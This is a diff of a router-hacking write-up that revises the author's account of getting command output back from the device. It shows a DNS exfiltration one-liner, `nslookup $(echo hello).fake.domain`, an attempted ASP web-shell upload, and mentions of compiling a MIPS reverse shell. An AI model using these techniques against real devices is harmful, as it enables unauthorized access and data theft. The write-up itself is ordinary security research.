@@ -295,11 +295,20 @@ But I did.
 Well, what is it then? Why wouldn't it work?
 
 I wanted to be able to get the output from the shell commands that I'm running in order to ease on the debugging process.
-I thought of two ways to do it:
-1. Set myself as the router's DNS server and force the router to issue DNS requests with the command output included.
+I thought of a couple of ways to do it:
+1. Upload a malicious ASP page, _Web Shell_ if you will, and execute commands with the output returned.
+2. Look for files that are displayed within the web interface and write my output to them.
+3. Set myself as the router's DNS server and force the router to issue DNS requests with the command output included.
 For instance, `nslookup $(echo hello).fake.domain`, and then I'd receive a DNS Query request of `hello.fake.domain`.
 However this method is less preferred because extracting the data programmatically from the DNS requests could be quite tedious.
-2. Looking for files that are displayed within the web interface and write my output to them.
+
+I started off with the attempt to upload a web shell onto the `www` directory.
+When I browsed to it, the web server replied with `404 Not Found`. I inferred that the web server corresponds to predefined constant paths like `/Ping.asp`,
+and that it doesn't simply lookup the files within `www`.
+
+Having that in mind, I attempted to overwrite an existing page,
+hoping I'll now receive my own crafted page. I was surprised to see that it still served me the original one.
+It seems that the server caches the pages in memory when `httpd` starts, and doesn't reload the pages until a reboot occurs.
 
 I then recalled the ping interface.  
 The output was the exact output of the `ping` command.
@@ -350,6 +359,10 @@ I tried running it and I received `SIGSEGV` on my ping log.
 Seems to be that I failed to compile the reverse shell correctly to the target.
 
 # Compiling
+It's crucial for me to state that I wanted to be able to compile and run my **own program**.  
+That is why I did not attempt beforehand to deploy a reverse shell using `bash`, `nc`, `python`, `perl`, etc.
+Though, even if I wanted to, none of those were available on the system.
+
 Throughout the process I learned that MIPS, which is the architecture that the router runs, has a lot of different variations,
 and that compiling a program to run on the device turned out to be a bigger challenge than I expected.
 
